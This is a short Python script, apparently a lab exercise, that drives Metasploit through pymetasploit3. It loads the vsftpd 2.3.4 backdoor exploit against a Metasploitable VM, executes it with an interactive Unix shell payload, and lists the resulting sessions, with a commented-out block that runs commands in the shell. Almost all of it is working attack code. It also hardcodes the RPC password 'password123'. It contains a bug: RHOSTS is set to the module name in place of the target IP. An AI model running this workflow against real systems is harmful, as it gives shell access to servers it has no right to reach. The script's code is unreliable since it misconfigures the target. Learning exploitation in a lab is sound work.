'''
based on ...
https://github.com/allfro/pymetasploit

'''

from pymetasploit3.msfrpc import *

# help(MsfRpcClient)
metasploitableIP = '192.168.56.104'

# started with this:
# msfrpcd -P password123

tgtExploit = 'unix/ftp/vsftpd_234_backdoor'
client = MsfRpcClient('password123', ssl=True)

'''
MsfRpcClient is segmented into different management modules

    auth: manages the authentication of clients for the msfrpcd daemon.
    consoles: manages interaction with consoles/shells created by Metasploit modules.
    core: manages the Metasploit framework core.
    db: manages the backend database connectivity for msfrpcd.
    modules: manages the interaction and configuration of Metasploit modules (i.e. exploits, auxiliaries, etc.)
    plugins: manages the plugins associated with the Metasploit core.
    sessions: manages the interaction with Metasploit meterpreter sessions.
'''
print([m for m in dir(client) if not m.startswith('_')])

# list of all the available modules, it's a lot
# print(client.modules.exploits)

# another way
'''
print(client.modules.auxiliary)
print(client.modules.encoders)
print(client.modules.nops)
print(client.modules.payloads)
print(client.modules.post)
'''
# set exploit
exploit = client.modules.use('exploit', tgtExploit)
# print details
print(exploit.description)
print(exploit.authors)
print(exploit.options)
print(exploit.required)

# list payloads
print(exploit.payloads)
# specify target:
exploit['RHOSTS'] = tgtExploit
# set verbose option to true
exploit['VERBOSE'] = True

# execute it
exploit.execute(payload='cmd/unix/interact')
# list session
print(client.sessions.list)
'''
shell = client.sessions.session(1)
shell.write('whoami\n')
print(shell.read())
'''